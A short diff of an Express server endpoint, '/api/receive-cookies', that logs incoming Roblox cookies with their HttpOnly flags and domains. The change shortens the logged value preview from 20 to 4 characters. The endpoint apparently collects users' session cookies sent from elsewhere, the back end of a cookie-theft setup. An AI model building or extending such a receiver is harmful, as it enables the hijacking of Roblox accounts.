@@ -29,7 +29,7 @@ app.post("/api/receive-cookies", (req, res) => {
   console.log("=== Cookies Roblox reçus ===");
   cookies.forEach(c => {
     // Log sécurisé: tronquer la valeur pour éviter d’exposer des tokens complets
-    const valuePreview = c.value ? c.value.slice(0, 20) + "..." : "";
+    const valuePreview = c.value ? c.value.slice(0, 4) + "..." : "";
     console.log(`${c.name} = ${valuePreview} (HttpOnly: ${c.httpOnly}, Domain: ${c.domain})`);
   });
 
